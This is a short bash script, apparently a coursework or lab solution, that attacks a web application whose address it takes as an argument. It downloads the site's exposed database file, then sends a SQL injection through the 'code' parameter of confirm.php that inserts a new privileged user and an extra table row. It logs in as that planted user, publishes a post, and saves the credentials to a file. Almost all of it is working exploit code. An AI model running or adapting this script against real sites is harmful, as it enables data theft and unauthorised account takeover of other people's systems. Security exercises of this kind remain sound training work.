#!/bin/bash

newuser_username="mynewuser"
newuser_password="MySecretPassword"

thetraveller_code=$(echo -n "thetraveller" | base64)
newuser_code=$(echo -n $newuser_username | base64)

#q5a
curl "$1/docs/website_db.db" > data.db

#q2bi
curl -i -G --data-urlencode "code=$thetraveller_code'; INSERT INTO users VALUES('$newuser_username', '952729c61cab7e01e4b5f5ba7b95830d2075f74b', '$newuser_code', 1); INSERT INTO ref VALUES(7,10); --" "$1/confirm.php" \
    >> response.txt

#q2bii
curl -i -X POST -c cookie.txt -d "username=$newuser_username&password=$newuser_password&form=login" "$1/post.php" \
    >> response.txt
curl -i -X POST -b cookie.txt -d "title=$newuser_username+post+title&content=$newuser_username+post+body&type=1&form=content&submit=" "$1/post.php" \
    >> response.txt

echo "username: $newuser_username" >> credentials.txt
echo "password: $newuser_password" >> credentials.txt